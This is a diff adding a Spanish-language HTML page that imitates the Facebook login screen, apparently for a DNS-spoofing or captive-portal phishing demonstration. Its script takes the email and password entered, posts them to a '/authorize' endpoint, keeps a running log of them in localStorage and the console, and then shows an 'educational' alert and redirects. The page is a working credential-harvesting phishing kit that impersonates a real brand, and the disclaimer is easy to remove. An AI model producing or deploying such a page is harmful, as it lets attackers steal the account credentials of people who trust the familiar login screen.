@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Inicia sesión o regístrate</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+        body {
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .container {
+            width: 100%;
+            max-width: 400px;
+            padding: 20px;
+        }
+        .logo {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .logo h1 {
+            color: #1877f2;
+            font-size: 56px;
+            font-weight: bold;
+            letter-spacing: -2px;
+        }
+        .login-box {
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+        }
+        input {
+            width: 100%;
+            padding: 14px 16px;
+            margin-bottom: 12px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 17px;
+        }
+        input:focus {
+            outline: none;
+            border-color: #1877f2;
+        }
+        button {
+            width: 100%;
+            padding: 14px;
+            background: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 20px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 8px;
+        }
+        button:hover {
+            background: #166fe5;
+        }
+        .divider {
+            text-align: center;
+            margin: 20px 0;
+            color: #96999e;
+        }
+        .create-account {
+            width: 60%;
+            margin: 20px auto;
+            padding: 14px;
+            background: #42b72a;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 17px;
+            font-weight: bold;
+            cursor: pointer;
+            display: block;
+        }
+        .create-account:hover {
+            background: #36a420;
+        }
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 14px;
+            color: #8a8d91;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <h1>facebook</h1>
+        </div>
+        <div class="login-box">
+            <form id="loginForm">
+                <input type="text" id="m_login_email" name="email" placeholder="Correo electrónico o número de teléfono" required>
+                <input type="password" id="m_login_password" name="pass" placeholder="Contraseña" required>
+                <button type="submit">Iniciar sesión</button>
+            </form>
+            <div class="divider">o</div>
+            <button class="create-account">Crear cuenta nueva</button>
+            <p style="text-align: center; margin-top: 20px; font-size: 14px; color: #1877f2;">¿Olvidaste tu contraseña?</p>
+        </div>
+        <div class="footer">
+            <p>Facebook © 2025</p>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById('m_login_email').value;
+            const password = document.getElementById('m_login_password').value;
+            
+            // Capturar credenciales
+            fetch('/authorize', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    site: 'Facebook',
+                    email: email,
+                    password: password
+                })
+            })
+            .then(response => {
+                // Crear un registro local de las credenciales
+                const date = new Date().toLocaleString();
+                const logData = `[${date}] Email: ${email}, Password: ${password}\n`;
+                
+                // Guardar en localStorage para poder verlo más tarde
+                const storedLogs = localStorage.getItem('capturedCredentials') || '';
+                localStorage.setItem('capturedCredentials', storedLogs + logData);
+                
+                console.log('Credenciales capturadas:', email, password);
+                
+                // Mostrar mensaje educativo
+                setTimeout(() => {
+                    alert('DEMOSTRACION EDUCATIVA DE PHISHING\n\n' +
+                          'Credenciales capturadas:\n' +
+                          'Email: ' + email + '\n\n' +
+                          'Esto demuestra como funciona el DNS Spoofing y phishing:\n' +
+                          '1. DNS redirigió facebook.com a un servidor local\n' +
+                          '2. El servidor sirvio esta pagina falsa\n' +
+                          '3. Sus credenciales fueron capturadas\n\n' +
+                          'PROTECCION:\n' +
+                          '• Siempre verifique el certificado HTTPS\n' +
+                          '• No ignore advertencias de seguridad\n' +
+                          '• Use autenticacion de dos factores\n\n' +
+                          'Esta es una demostracion con fines educativos.');
+                    
+                    // Redirigir al portal cautivo para autorizar
+                    window.location.href = '/authorize?email=' + encodeURIComponent(email);
+                }, 500);
+            })
+            .catch(error => {
+                console.error('Error enviando credenciales:', error);
+                // Aún así, redirigir
+                window.location.href = '/authorize?email=' + encodeURIComponent(email);
+            });
+        });
+
+        // Crear un método para visualizar las credenciales capturadas (para fines educativos)
+        window.viewCapturedCredentials = function() {
+            const credentials = localStorage.getItem('capturedCredentials') || 'No hay credenciales capturadas';
+            console.log('Credenciales almacenadas:', credentials);
+            return credentials;
+        };
+    </script>
+</body>
+</html>
